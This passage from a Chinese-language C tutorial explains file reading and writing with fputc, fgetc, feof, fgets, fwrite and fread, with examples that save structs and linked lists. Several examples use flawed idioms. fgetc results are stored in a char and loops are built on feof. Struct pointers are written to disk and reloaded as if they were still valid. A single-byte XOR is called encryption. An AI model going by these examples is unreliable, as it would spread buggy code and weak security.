<td align="center">int 写入成功，返回写入成功字符，如果失败，返回 EOF。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 1.打开一个文件</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line"></span><br><span class="line">    // 2.往文件中写入内容</span><br><span class="line">    for(char ch = &#x27;a&#x27;; ch &lt;= &#x27;z&#x27;; ch++)&#123;</span><br><span class="line">        // 一次写入一个字符</span><br><span class="line">        char res = fputc(ch, fp);</span><br><span class="line">        printf(&quot;res = %c\n&quot;, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3.关闭打开的文件</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>读取</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center">int fgetc ( FILE * stream );</th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">从文件流中读取一个字符并返回。</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">FILE* stream :指向文件缓冲的指针。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">int 正常，返回读取的字符；读到文件尾或出错时，为 EOF。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 1.打开一个文件</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;r+&quot;);</span><br><span class="line"></span><br><span class="line">    // 2.从文件中读取内容</span><br><span class="line">    char res = EOF;</span><br><span class="line">    while((res = fgetc(fp)) != EOF)&#123;</span><br><span class="line">        printf(&quot;res = %c\n&quot;, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3.关闭打开的文件</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>判断文件末尾<ul>
<li>feof函数</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center">int feof( FILE * stream );</th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">判断文件是否读到文件结尾</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">FILE* stream :指向文件缓冲的指针。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">int 0 未读到文件结尾，非零 读到文件结尾。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 1.打开一个文件</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;r+&quot;);</span><br><span class="line"></span><br><span class="line">    // 2.从文件中读取内容</span><br><span class="line">    char res = EOF;</span><br><span class="line">    // 注意: 由于只有先读了才会修改标志位,</span><br><span class="line">    // 所以通过feof判断是否到达文件末尾, 一定要先读再判断, 不能先判断再读</span><br><span class="line">    while((res = fgetc(fp)) &amp;&amp; (!feof(fp)))&#123;</span><br><span class="line">        printf(&quot;res = %c\n&quot;, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3.关闭打开的文件</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>注意点:</li>
<li>feof 这个函数，是去读标志位判断文件是否结束的。</li>
<li>而标志位只有读完了才会被修改, 所以如果先判断再读标志位会出现多打一次的的现象</li>
<li>所以企业开发中使用feof函数一定要先读后判断, 而不能先判断后读</li>
</ul>
</blockquote>
<ul>
<li>作业<ul>
<li>实现文件的简单加密和解密</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void encode(char *name, char *newName, int code);</span><br><span class="line">void decode(char *name, char *newName, int code);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    encode(&quot;main.c&quot;, &quot;encode.c&quot;, 666);</span><br><span class="line">    decode(&quot;encode.c&quot;, &quot;decode.c&quot;, 666);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief encode 加密文件</span><br><span class="line"> * @param name 需要加密的文件名称</span><br><span class="line"> * @param newName 加密之后的文件名称</span><br><span class="line"> * @param code 秘钥</span><br><span class="line"> */</span><br><span class="line">void encode(char *name, char *newName, int code)&#123;</span><br><span class="line">    FILE *fw = fopen(newName, &quot;w+&quot;);</span><br><span class="line">    FILE *fr = fopen(name, &quot;r+&quot;);</span><br><span class="line">    char ch = EOF;</span><br><span class="line">    while((ch = fgetc(fr)) &amp;&amp; (!feof(fr)))&#123;</span><br><span class="line">        fputc(ch ^ code, fw);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fw);</span><br><span class="line">    fclose(fr);</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief encode 解密文件</span><br><span class="line"> * @param name 需要解密的文件名称</span><br><span class="line"> * @param newName 解密之后的文件名称</span><br><span class="line"> * @param code 秘钥</span><br><span class="line"> */</span><br><span class="line">void decode(char *name, char *newName, int code)&#123;</span><br><span class="line">    FILE *fw = fopen(newName, &quot;w+&quot;);</span><br><span class="line">    FILE *fr = fopen(name, &quot;r+&quot;);</span><br><span class="line">    char ch = EOF;</span><br><span class="line">    while((ch = fgetc(fr)) &amp;&amp; (!feof(fr)))&#123;</span><br><span class="line">        fputc(ch ^ code, fw);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fw);</span><br><span class="line">    fclose(fr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一次读写一行字符"><a href="#一次读写一行字符" class="headerlink" title="一次读写一行字符"></a>一次读写一行字符</h2><ul>
<li><p>什么是行</p>
</li>
<li><p>行是文本编辑器中的概念，文件流中就是一个字符。这个在不同的平台是有差异的。window 平台 ‘\r\n’，linux 平台是’\n’</p>
</li>
<li><p>平台差异</p>
<ul>
<li>windows 平台在写入’\n’是会体现为’\r\n’，linux 平台在写入’\n’时会体现为’\n’。windows 平台在读入’\r\n’时，体现为一个字符’\n’，linux 平台在读入’\n’时，体现为一个字符’\n’</li>
<li>linux 读 windows 中的换行，则会多读一个字符，windows 读 linux 中的换行，则没有问题</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fw = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    fputc(&#x27;a&#x27;, fw);</span><br><span class="line">    fputc(&#x27;\n&#x27;, fw);</span><br><span class="line">    fputc(&#x27;b&#x27;, fw);</span><br><span class="line">    fclose(fw);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/C/1d80c69a41198813f0bb19cef89b74ea.png" alt="img"></p>
<hr>
<ul>
<li>写入一行</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center">int fputs(char *str,FILE *fp)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">把 str 指向的字符串写入 fp 指向的文件中。</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">char * str : 表示指向的字符串的指针。</td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">FILE *fp : 指向文件流结构的指针。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">int 正常，返 0；出错返 EOF。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fw = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    // 注意: fputs不会自动添加\n</span><br><span class="line">    fputs(&quot;lnj\n&quot;, fw);</span><br><span class="line">    fputs(&quot;it666\n&quot;, fw);</span><br><span class="line">    fclose(fw);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>遇到\0自动终止写入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    // 注意: fputs写入时遇到\0就会自动终止写入</span><br><span class="line">    fputs(&quot;lnj\0it666\n&quot;, fp);</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>读取一行</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center">char *fgets(char *str,int length,FILE *fp)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">从 fp 所指向的文件中，至多读 length-1 个字符，送入字符数组 str 中， 如果在读入 length-1 个字符结束前遇\n 或 EOF，读入即结束，字符串读入后在最后加一个‘\0’字符。</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">char * str :指向需要读入数据的缓冲区。</td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">int length :每一次读数字符的字数。</td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">FILE* fp :文件流指针。</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">char * 正常，返 str 指针；出错或遇到文件结尾 返空指针 NULL。</td>
</tr>
</tbody></table>
<ul>
<li>最多只能读取N-1个字符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    // 注意: fputs不会自动添加\n</span><br><span class="line">    fputs(&quot;it666\n&quot;, fp);</span><br><span class="line"></span><br><span class="line">    // 将FILE结构体中的读写指针重新移动到最前面</span><br><span class="line">    // 注意: FILE结构体中读写指针每读或写一个字符后都会往后移动</span><br><span class="line">    rewind(fp);</span><br><span class="line">    char str[1024];</span><br><span class="line">    // 从fp中读取4个字符, 存入到str中</span><br><span class="line">    // 最多只能读取N-1个字符, 会在最后自动添加\0</span><br><span class="line">    fgets(str, 4, fp);</span><br><span class="line"></span><br><span class="line">    printf(&quot;str = %s&quot;, str); // it6</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>遇到\n自动结束</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    // 注意: fputs不会自动添加\n</span><br><span class="line">    fputs(&quot;lnj\n&quot;, fp);</span><br><span class="line">    fputs(&quot;it666\n&quot;, fp);</span><br><span class="line"></span><br><span class="line">    // 将FILE结构体中的读写指针重新移动到最前面</span><br><span class="line">    // 注意: FILE结构体中读写指针每读或写一个字符后都会往后移动</span><br><span class="line">    rewind(fp);</span><br><span class="line">    char str[1024];</span><br><span class="line">    // 从fp中读取1024个字符, 存入到str中</span><br><span class="line">    // 但是读到第4个就是\n了, 函数会自动停止读取</span><br><span class="line">    // 注意点: \n会被读取进来</span><br><span class="line">    fgets(str, 1024, fp);</span><br><span class="line"></span><br><span class="line">    printf(&quot;str = %s&quot;, str); // lnj</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>读取到EOF自动结束</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    // 注意: fputs不会自动添加\n</span><br><span class="line">    fputs(&quot;lnj\n&quot;, fp);</span><br><span class="line">    fputs(&quot;it666&quot;, fp);</span><br><span class="line"></span><br><span class="line">    // 将FILE结构体中的读写指针重新移动到最前面</span><br><span class="line">    // 注意: FILE结构体中读写指针每读或写一个字符后都会往后移动</span><br><span class="line">    rewind(fp);</span><br><span class="line">    char str[1024];</span><br><span class="line">    // 每次从fp中读取1024个字符, 存入到str中</span><br><span class="line">    // 读取到文件末尾自动结束</span><br><span class="line">    while(fgets(str, 1024, fp))&#123;</span><br><span class="line">        printf(&quot;str = %s&quot;, str);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>注意点:<ul>
<li>企业开发中能不用feof函数就不用feof函数</li>
<li>如果最后一行，没有行‘\n’的话则少读一行</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    // 注意: fputs不会自动添加\n</span><br><span class="line">    fputs(&quot;12345678910\n&quot;, fp);</span><br><span class="line">    fputs(&quot;12345678910\n&quot;, fp);</span><br><span class="line">    fputs(&quot;12345678910&quot;, fp);</span><br><span class="line"></span><br><span class="line">    // 将FILE结构体中的读写指针重新移动到最前面</span><br><span class="line">    // 注意: FILE结构体中读写指针每读或写一个字符后都会往后移动</span><br><span class="line">    rewind(fp);</span><br><span class="line">    char str[1024];</span><br><span class="line">    // 每次从fp中读取1024个字符, 存入到str中</span><br><span class="line">    // 读取到文件末尾自动结束</span><br><span class="line">    while(fgets(str, 1024, fp) &amp;&amp; !feof(fp))&#123;</span><br><span class="line">        printf(&quot;str = %s&quot;, str);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>作业:<ul>
<li>利用fgets(str, 5, fp)读取下列文本会读取多少次?</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12345678910</span><br><span class="line">12345</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<h2 id="一次读写一块数据"><a href="#一次读写一块数据" class="headerlink" title="一次读写一块数据"></a>一次读写一块数据</h2><ul>
<li><p>C 语言己经从接口的层面区分了，文本的读写方式和二进制的读写方式。前面我们讲的是文本的读写方式。</p>
</li>
<li><p>所有的文件接口函数，要么以 ‘\0’，表示输入结束，要么以 ‘\n’， EOF(0xFF)表示读取结束。 ‘\0’ ‘\n’ 等都是文本文件的重要标识，而所有的二进制接口对于这些标识，是不敏感的。<br>+二进制的接口可以读文本，而文本的接口不可以读二进制</p>
</li>
<li><p>一次写入一块数据</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center">int fwrite(void *buffer, int num_bytes, int count, FILE *fp)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">把buffer 指向的数据写入fp 指向的文件中</td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">char * buffer : 指向要写入数据存储区的首地址的指针</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">int num_bytes: 每个要写的字段的字节数count</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">int count : 要写的字段的个数</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">FILE* fp : 要写的文件指针</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">int 成功，返回写的字段数；出错或文件结束，返回 0。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;wb+&quot;);</span><br><span class="line">    // 注意: fwrite不会关心写入数据的格式</span><br><span class="line">    char *str = &quot;lnj\0it666&quot;;</span><br><span class="line">     /*</span><br><span class="line">     * 第一个参数: 被写入数据指针</span><br><span class="line">     * 第二个参数: 每次写入多少个字节</span><br><span class="line">     * 第三个参数: 需要写入多少次</span><br><span class="line">     * 第四个参数: 已打开文件结构体指针</span><br><span class="line">     */</span><br><span class="line">    fwrite((void *)str, 9, 1, fp);</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>一次读取一块数据</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center">int fread(void *buffer, int num_bytes, int count, FILE *fp)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">把fp 指向的文件中的数据读到 buffer 中。</td>
</tr>
<tr>
<td align="center">参数</td>
<td align="center">char * buffer : 指向要读入数据存储区的首地址的指针</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">int num_bytes: 每个要读的字段的字节数count</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">int count : 要读的字段的个数</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">FILE* fp : 要读的文件指针</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">int 成功，返回读的字段数；出错或文件结束，返回 0。</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // test.txt中存放的是&quot;lnj\0it666&quot;</span><br><span class="line">    FILE *fr = fopen(&quot;test.txt&quot;, &quot;rb+&quot;);</span><br><span class="line">    char buf[1024] = &#123;0&#125;;</span><br><span class="line">    // fread函数读取成功返回读取到的字节数, 读取失败返回0</span><br><span class="line">    /*</span><br><span class="line">     * 第一个参数: 存储读取到数据的容器</span><br><span class="line">     * 第二个参数: 每次读取多少个字节</span><br><span class="line">     * 第三个参数: 需要读取多少次</span><br><span class="line">     * 第四个参数: 已打开文件结构体指针</span><br><span class="line">     */ </span><br><span class="line">    int n = fread(buf, 1, 1024, fr);</span><br><span class="line">    printf(&quot;%i\n&quot;, n);</span><br><span class="line">    for(int i = 0; i &lt; n; i++)&#123;</span><br><span class="line">        printf(&quot;%c&quot;, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fr);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>注意点:</li>
<li>读取时num_bytes应该填写读取数据类型的最小单位, 而count可以随意写</li>
<li>如果读取时num_bytes不是读取数据类型最小单位, 会引发读取失败</li>
<li>例如: 存储的是char类型 6C 6E 6A 00 69 74 36 36 36<br>如果num_bytes等于1, count等于1024, 那么依次取出 6C 6E 6A 00 69 74 36 36 36 , 直到取不到为止<br>如果num_bytes等于4, count等于1024, 那么依次取出[6C 6E 6A 00][69 74 36 36] , 但是最后还剩下一个36, 但又不满足4个字节, 那么最后一个36则取不到</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    // test.txt中存放的是&quot;lnj\0it666&quot;</span><br><span class="line">    FILE *fr = fopen(&quot;test.txt&quot;, &quot;rb+&quot;);</span><br><span class="line">    char buf[1024] = &#123;0&#125;;</span><br><span class="line">    /*</span><br><span class="line">    while(fread(buf, 4, 1, fr) &gt; 0)&#123;</span><br><span class="line">        printf(&quot;%c\n&quot;, buf[0]);</span><br><span class="line">        printf(&quot;%c\n&quot;, buf[1]);</span><br><span class="line">        printf(&quot;%c\n&quot;, buf[2]);</span><br><span class="line">        printf(&quot;%c\n&quot;, buf[3]);</span><br><span class="line">    &#125;</span><br><span class="line">    */</span><br><span class="line">    /*</span><br><span class="line">    while(fread(buf, 1, 4, fr) &gt; 0)&#123;</span><br><span class="line">        printf(&quot;%c\n&quot;, buf[0]);</span><br><span class="line">        printf(&quot;%c\n&quot;, buf[1]);</span><br><span class="line">        printf(&quot;%c\n&quot;, buf[2]);</span><br><span class="line">        printf(&quot;%c\n&quot;, buf[3]);</span><br><span class="line">    &#125;</span><br><span class="line">    */</span><br><span class="line">    while(fread(buf, 1, 1, fr) &gt; 0)&#123;</span><br><span class="line">        printf(&quot;%c\n&quot;, buf[0]);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fr);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>注意: fwrite和fread本质是用来操作二进制的</li>
<li>所以下面用法才是它们的正确打开方法</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;wb+&quot;);</span><br><span class="line">    int ages[4] = &#123;1, 3, 5, 6&#125;;</span><br><span class="line">    fwrite(ages, sizeof(ages), 1, fp);</span><br><span class="line">    rewind(fp);</span><br><span class="line">    int data;</span><br><span class="line">    while(fread(&amp;data, sizeof(int), 1, fp) &gt; 0)&#123;</span><br><span class="line">        printf(&quot;data = %i\n&quot;, data);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="读写结构体"><a href="#读写结构体" class="headerlink" title="读写结构体"></a>读写结构体</h2><ul>
<li>结构体中的数据类型不统一，此时最适合用二进制的方式进行读写</li>
<li>读写单个结构体</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct&#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">    double height;</span><br><span class="line">&#125; Person;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Person p1 = &#123;&quot;lnj&quot;, 35, 1.88&#125;;</span><br><span class="line">//    printf(&quot;name = %s\n&quot;, p1.name);</span><br><span class="line">//    printf(&quot;age = %i\n&quot;, p1.age);</span><br><span class="line">//    printf(&quot;height = %lf\n&quot;, p1.height);</span><br><span class="line"></span><br><span class="line">    FILE *fp = fopen(&quot;person.stu&quot;, &quot;wb+&quot;);</span><br><span class="line">    fwrite(&amp;p1, sizeof(p1), 1, fp);</span><br><span class="line"></span><br><span class="line">    rewind(fp);</span><br><span class="line">    Person p2;</span><br><span class="line">    fread(&amp;p2, sizeof(p2), 1, fp);</span><br><span class="line">    printf(&quot;name = %s\n&quot;, p2.name);</span><br><span class="line">    printf(&quot;age = %i\n&quot;, p2.age);</span><br><span class="line">    printf(&quot;height = %lf\n&quot;, p2.height);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>读写结构体数组</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct&#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">    double height;</span><br><span class="line">&#125; Person;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Person ps[] = &#123;</span><br><span class="line">      &#123;&quot;zs&quot;, 18, 1.65&#125;,</span><br><span class="line">      &#123;&quot;ls&quot;, 21, 1.88&#125;,</span><br><span class="line">      &#123;&quot;ww&quot;, 33, 1.9&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    FILE *fp = fopen(&quot;person.stu&quot;, &quot;wb+&quot;);</span><br><span class="line">    fwrite(&amp;ps, sizeof(ps), 1, fp);</span><br><span class="line"></span><br><span class="line">    rewind(fp);</span><br><span class="line">    Person p;</span><br><span class="line">    while(fread(&amp;p, sizeof(p), 1, fp) &gt; 0)&#123;</span><br><span class="line">        printf(&quot;name = %s\n&quot;, p.name);</span><br><span class="line">        printf(&quot;age = %i\n&quot;, p.age);</span><br><span class="line">        printf(&quot;height = %lf\n&quot;, p.height);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>读写结构体链表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct person&#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">    double height;</span><br><span class="line">    struct person* next;</span><br><span class="line">&#125; Person;</span><br><span class="line">Person *createEmpty();</span><br><span class="line">void  insertNode(Person *head, char *name, int age, double height);</span><br><span class="line">void printfList(Person *head);</span><br><span class="line">int saveList(Person *head, char *name);</span><br><span class="line">Person *loadList(char *name);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">//    Person *head = createEmpty();</span><br><span class="line">//    insertNode(head, &quot;zs&quot;, 18, 1.9);</span><br><span class="line">//    insertNode(head, &quot;ls&quot;, 22, 1.65);</span><br><span class="line">//    insertNode(head, &quot;ws&quot;, 31, 1.78);</span><br><span class="line">//    printfList(head);</span><br><span class="line">//    saveList(head, &quot;person.list&quot;);</span><br><span class="line">    Person *head = loadList(&quot;person.list&quot;);</span><br><span class="line">    printfList(head);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @brief loadList 从文件加载链表</span><br><span class="line"> * @param name 文件名称</span><br><span class="line"> * @return  加载好的链表头指针</span><br><span class="line"> */</span><br><span class="line">Person *loadList(char *name)&#123;</span><br><span class="line">    // 1.打开文件</span><br><span class="line">    FILE *fp = fopen(name, &quot;rb+&quot;);</span><br><span class="line">    if(fp == NULL)&#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    // 2.创建一个空链表</span><br><span class="line">    Person *head = createEmpty();</span><br><span class="line">    // 3.创建一个节点</span><br><span class="line">    Person *node = (Person *)malloc(sizeof(Person));</span><br><span class="line">    while(fread(node, sizeof(Person), 1, fp) &gt; 0)&#123;</span><br><span class="line">        // 3.进行插入</span><br><span class="line">        // 3.1让新节点的下一个节点 等于 头节点的下一个节点</span><br><span class="line">        node-&gt;next = head-&gt;next;</span><br><span class="line">        // 3.2让头结点的下一个节点 等于 新节点</span><br><span class="line">        head-&gt;next = node;</span><br><span class="line"></span><br><span class="line">        // 给下一个节点申请空间</span><br><span class="line">        node = (Person *)malloc(sizeof(Person));</span><br><span class="line">    &#125;</span><br><span class="line">    // 释放多余的节点空间</span><br><span class="line">    free(node);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @brief saveList 存储链表到文件</span><br><span class="line"> * @param head 链表头指针</span><br><span class="line"> * @param name 存储的文件名称</span><br><span class="line"> * @return  是否存储成功 -1失败 0成功</span><br><span class="line"> */</span><br><span class="line">int saveList(Person *head, char *name)&#123;</span><br><span class="line">    // 1.打开文件</span><br><span class="line">    FILE *fp = fopen(name, &quot;wb+&quot;);</span><br><span class="line">    if(fp == NULL)&#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    // 2.取出头节点的下一个节点</span><br><span class="line">    Person *cur = head-&gt;next;</span><br><span class="line">    // 3.将所有有效节点保存到文件中</span><br><span class="line">    while(cur != NULL)&#123;</span><br><span class="line">        fwrite(cur, sizeof(Person), 1, fp);</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span 